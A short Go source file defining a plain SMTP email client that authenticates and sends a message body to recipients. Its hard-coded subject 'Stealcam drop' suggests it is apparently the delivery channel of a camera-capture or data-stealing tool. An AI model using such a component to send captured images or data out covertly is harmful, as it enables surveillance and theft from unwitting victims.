package mail

import (
	"net/smtp"
	"strings"
)

type EmailClient struct {
	url  string
	auth smtp.Auth
	from string
}

func New(host string, port string, username string, password string, from string) *EmailClient {
	return &EmailClient{
		url:  host + ":" + port,
		auth: smtp.PlainAuth("", username, password, host),
		from: from,
	}
}

func (c EmailClient) Send(to []string, body string) error {
	msg := []byte("To: " + strings.Join(to, ",") + "\r\n" +
		"Subject: Stealcam drop\r\n" +
		"From: " + c.from + "\r\n" +
		"\r\n" +
		body + "\r\n")
	return smtp.SendMail(c.url, c.auth, c.from, to, msg)
}
